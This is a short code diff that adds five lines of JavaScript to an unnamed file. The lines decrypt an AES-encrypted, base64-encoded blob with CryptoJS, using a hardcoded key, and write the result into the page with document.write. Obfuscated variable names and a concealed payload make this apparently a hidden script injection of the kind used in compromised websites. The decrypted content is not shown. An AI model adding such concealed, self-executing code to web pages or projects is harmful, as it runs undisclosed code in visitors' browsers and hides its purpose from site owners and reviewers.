@@ -1,0 +1,5 @@
+var SDlj="U2FsdGVkX188VKkaVZuMY7ATNCpQlusFtadqsJYCnc1Kek7pSsd8YrUbJphncP/tYavxxJnk67LlwM80D3r/eWJG1vrWUirk9qGorq1C6JrXTvo/XJhkCxspulr7jvDfGGCbKwuIzCkBQY0CD7VBYp0yPetY3plCTZBhaJziM/8L08kBSwK7j6uWc+HKPgcelTJ4INa5mMOzY829/mH+SfwgjplZTyNB072I0mzPpMUGPydriNCJYznsvJO4Wc7yfEPvlxFh7wbiwo5c3Ra2eRrMpUCDm9FAfGpZODCN9BvpYqgBEaNDo/7QO74/79fTdNhRkUWwGxoPIthM2ZaCPTgcKhaAycXNauLnjpLCWXdX8yt7HxKazpHiW+DnEVhcIrmijxg6353+d5MeqHc8ViDJ9IIGiQWjeXZMFyF+Rac7g6u05+Zf9jqxjk+LNq/gJMEzIJTBwHQE+mnzX+uzsuvmnf84NXUlBoqPGZGYMuYVKJBHBRpzz2OFEhmQYvw2" 
+ var BsUPu = "GGCLNPSsqPiiwzyr"; 
+ var MycLxXW= CryptoJS.AES.decrypt(SDlj, BsUPu); 
+ var MkQjBY = MycLxXW.toString(CryptoJS.enc.Utf8); 
+ document.write(MkQjBY) 
